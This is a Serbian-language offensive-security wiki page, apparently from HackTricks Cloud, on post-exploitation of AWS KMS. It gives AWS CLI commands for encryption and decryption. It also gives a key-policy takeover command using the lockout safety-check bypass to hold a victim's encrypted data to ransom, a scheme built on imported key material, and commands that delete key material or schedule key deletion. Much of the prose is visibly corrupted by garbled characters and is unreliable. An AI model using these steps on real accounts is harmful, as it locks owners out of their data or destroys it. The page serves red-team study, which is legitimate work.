# AWS - KMS Post Exploitation

{% hint style="success" %}
Nau캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Nau캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## KMS

Za vi코e informacija pogledajte:

{% content-ref url="../../aws-security/aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../../aws-security/aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### 말frovanje/De코ifrovanje informacija

* Kori코캖enje **simetri캜nog** klju캜a
```bash
# Encrypt data
aws kms encrypt \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--key-id f0d3d719-b054-49ec-b515-4095b4777049 \
--output text \
--query Plaintext | base64 \
--decode
```
* Kori코캖enje **asimetri캜nog** klju캜a:
```bash
# Encrypt data
aws kms encrypt \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--plaintext fileb:///tmp/hello.txt \
--output text \
--query CiphertextBlob | base64 \
--decode > ExampleEncryptedFile

# Decrypt data
aws kms decrypt \
--ciphertext-blob fileb://ExampleEncryptedFile \
--encryption-algorithm RSAES_OAEP_SHA_256 \
--key-id d6fecf9d-7aeb-4cd4-bdd3-9044f3f6035a \
--output text \
--query Plaintext | base64 \
--decode
```
{% hint style="warning" %}
Ako dobijate gre코ku 'An error occurred (InvalidCiphertextException) when calling the Decrypt operation:' prilikom poku코aja da izvr코ite kms decrypt, poku코ajte da koristite **`--ciphertext-blob file://`** umesto **`fileb://`**.

Kori코캖enje **`file://`** vam omogu캖ava pogodnost kori코캖enja fajlova napisanih u va코em preferiranom kodiranju kada koristite CLI.
U verzijama 1.6.3 i novijim verzijama CLI-a, imate pristup drugom na캜inu za prosle캠ivanje sadr쬬ja fajla CLI-u, **`fileb://`**. Radi sli캜no kao **`file://`**, ali umesto da 캜ita sadr쬬j fajla kao tekst, 캜ita ga kao binarni.

U ve캖ini slu캜ajeva, **`file://`** 캖e zadovoljiti va코u potrebu za prosle캠ivanjem sadr쬬ja fajla kao ulaz. Me캠utim, postoje neki slu캜ajevi gde **`fileb://`** mora biti kori코캖en da bi se sadr쬬j fajla prosledio kao binarni umesto kao tekst.
Pro캜itajte vi코e od AWS-a ovde: [AWS Blog - Best Practice for Local File Parameters](https://aws.amazon.com/blogs/developer/best-practices-for-local-file-parameters/)
{% endhint %}

### KMS Ransomware

Napada캜 sa privilegovanim pristupom nad KMS-om mogao bi da izmeni KMS politiku klju캜eva i **dodeli svom nalogu pristup nad njima**, uklanjaju캖i pristup dodeljen legitimnom nalogu.

Tada, korisnici legitimnog naloga ne캖e mo캖i da pristupe bilo kojoj informaciji bilo koje usluge koja je 코ifrovana tim klju캜evima, stvaraju캖i jednostavan ali efikasan ransomware nad nalogom.

{% hint style="warning" %}
Napomena da **AWS upravljani klju캜evi nisu pogo캠eni** ovim napadom, samo **klijentski upravljani klju캜evi**.

Tako캠e napomena o potrebi kori코캖enja parametra **`--bypass-policy-lockout-safety-check`** (nedostatak ove opcije u web konzoli 캜ini ovaj napad mogu캖im samo iz CLI-a).
{% endhint %}
```bash
# Force policy change
aws kms put-key-policy --key-id mrk-c10357313a644d69b4b28b88523ef20c \
--policy-name default \
--policy file:///tmp/policy.yaml \
--bypass-policy-lockout-safety-check

{
"Id": "key-consolepolicy-3",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::<your_own_account>:root"
},
"Action": "kms:*",
"Resource": "*"
}
]
}
```
{% hint style="danger" %}
Imajte na umu da ako promenite tu politiku i date pristup samo eksternom nalogu, a zatim sa ovog eksternog naloga poku코ate da postavite novu politiku da **vratite pristup originalnom nalogu, ne캖ete mo캖i**.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Generic KMS Ransomware

#### Global KMS Ransomware

Postoji jo코 jedan na캜in za izvo캠enje globalnog KMS Ransomware-a, koji bi uklju캜ivao slede캖e korake:

* Kreirajte novi **klju캜 sa klju캜nim materijalom** koji je uvezao napada캜
* **Ponovo 코ifrujte starije podatke** 코ifrovane prethodnom verzijom sa novom.
* **Obri코ite KMS klju캜**
* Sada samo napada캜, koji ima originalni klju캜ni materijal, mo쬰 da de코ifruje 코ifrovane podatke

### Destroy keys
```bash
# Destoy they key material previously imported making the key useless
aws kms delete-imported-key-material --key-id 1234abcd-12ab-34cd-56ef-1234567890ab

# Schedule the destoy of a key (min wait time is 7 days)
aws kms schedule-key-deletion \
--key-id arn:aws:kms:us-west-2:123456789012:key/1234abcd-12ab-34cd-56ef-1234567890ab \
--pending-window-in-days 7
```
{% hint style="danger" %}
Napomena da AWS sada **spre캜ava prethodne akcije da se izvr코e sa naloga u drugom vlasni코tvu:**
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Nau캜ite i ve쬭ajte AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Nau캜ite i ve쬭ajte GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Pogledajte [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Delite hacking trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
